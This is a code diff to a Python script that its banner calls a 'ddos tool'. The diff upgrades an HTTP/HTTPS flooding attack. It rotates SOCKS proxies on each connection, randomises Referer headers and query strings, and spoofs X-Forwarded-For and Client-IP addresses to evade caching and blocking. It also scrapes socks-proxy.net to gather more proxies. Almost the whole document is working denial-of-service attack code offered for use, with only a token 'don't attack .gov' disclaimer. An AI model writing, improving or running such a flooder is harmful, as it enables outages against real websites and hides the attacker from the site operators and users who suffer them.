@@ -14,6 +14,8 @@ import random
 import threading
 import sys
 import ssl
+import urllib.request
+
 
 print ('''
        /////    /////    /////////////
@@ -23,7 +25,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.8 (Improved Slow mode)
+Python3 version 2.9 (Improvement)
                             C0d3d by L330n123
 ╔═════════════════════════════════════════════╗
 ║        Tos: Don't attack .gov website       ║
@@ -182,27 +184,35 @@ acceptall = [
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
+referers = [
+	"https://www.google.com/search?q=",
+	"https://check-host.net/",
+	"https://www.facebook.com/",
+	"https://www.youtube.com/",
+	"https://www.fbi.com/",
+	"https://www.bing.com/search?q=",
+	"https://r.search.yahoo.com/",
+]
+strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 def cc(socks_type):
 	connection = "Connection: Keep-Alive\r\n"
-	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-	accept = random.choice(acceptall)
-	referer = "Referer: https://www.google.com/search?q="+ ip + url2 + "\r\n"
-	proxy = random.choice(proxies).strip().split(":")
-	if socks_type == 4:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-	if socks_type == 5:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	err = 0
 	if str(port) == "443" :
 		n = "HTTPS"
 	else:
 		n = "CC"
 	while True:
-		get_host = "GET " + url2 + "?" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 		fake_ip = "X-Forwarded-For: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
 		fake_ip += "Client-IP: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
-		request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
+		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+		accept = random.choice(acceptall)
+		referer = "Referer: "+random.choice(referers)+ ip + url2 + "\r\n"
 		try:
+			proxy = random.choice(proxies).strip().split(":")
+			if socks_type == 4:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			if socks_type == 5:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 3:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
@@ -210,10 +220,11 @@ def cc(socks_type):
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
-			s.send(str.encode(request))
 			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
+					get_host = "GET " + url2 + "?" + random.choice(strings)+str(random.randint(0,271400281257))+random.choice(strings)+str(random.randint(0,271004281257))+random.choice(strings) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
 					s.send(str.encode(request))
 				#s.close()
 			except:
@@ -221,7 +232,6 @@ def cc(socks_type):
 		except:
 			s.close()
 			err = err +1
-	cc(socks_type)
 def post(socks_type):
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
@@ -232,10 +242,6 @@ def post(socks_type):
 	data = str(random._urandom(16)) # You can enable bring data in HTTP Header
 	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	proxy = random.choice(proxies).strip().split(":")
-	if socks_type == 4:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-	if socks_type == 5:
-		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 	err = 0
 	if str(port) == "443" :
 		n = "HTTPS"
@@ -243,6 +249,11 @@ def post(socks_type):
 		n = "CC"
 	while True:
 		try:
+			proxy = random.choice(proxies).strip().split(":")
+			if socks_type == 4:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			if socks_type == 5:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 3:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
@@ -464,6 +475,26 @@ def main():
 					f.close()
 				except:
 					f.close()
+				try:#credit to All3xJ
+					req = urllib.request.Request("https://www.socks-proxy.net/")
+					req.add_header("User-Agent", random.choice(useragents))
+					sourcecode = urllib.request.urlopen(req)
+					part = str(sourcecode.read())
+					part = part.split("<tbody>")
+					part = part[1].split("</tbody>")
+					part = part[0].split("<tr><td>")
+					proxies = ""
+					for proxy in part:
+						proxy = proxy.split("</td><td>")
+						try:
+							proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+						except:
+							pass
+					out_file = open("socks4.txt","a")
+					out_file.write(proxies)
+					out_file.close()
+				except:
+					pass
 				print("> Have already downloaded socks4 list as socks4.txt")
 			if choice == "5":
 				f = open("socks5.txt",'wb')
@@ -540,6 +571,26 @@ def main():
 				f.close()
 			except:
 				f.close()
+			try:#credit to All3xJ
+				req = urllib.request.Request("https://www.socks-proxy.net/")
+				req.add_header("User-Agent", random.choice(useragents))
+				sourcecode = urllib.request.urlopen(req)
+				part = str(sourcecode.read())
+				part = part.split("<tbody>")
+				part = part[1].split("</tbody>")
+				part = part[0].split("<tr><td>")
+				proxies = ""
+				for proxy in part:
+					proxy = proxy.split("</td><td>")
+					try:
+						proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+					except:
+						pass
+				out_file = open("socks4.txt","a")
+				out_file.write(proxies)
+				out_file.close()
+			except:
+				pass
 			print("> Have already downloaded socks4 list as socks4.txt")
 		if choice == "5":
 			f = open("socks5.txt",'wb')
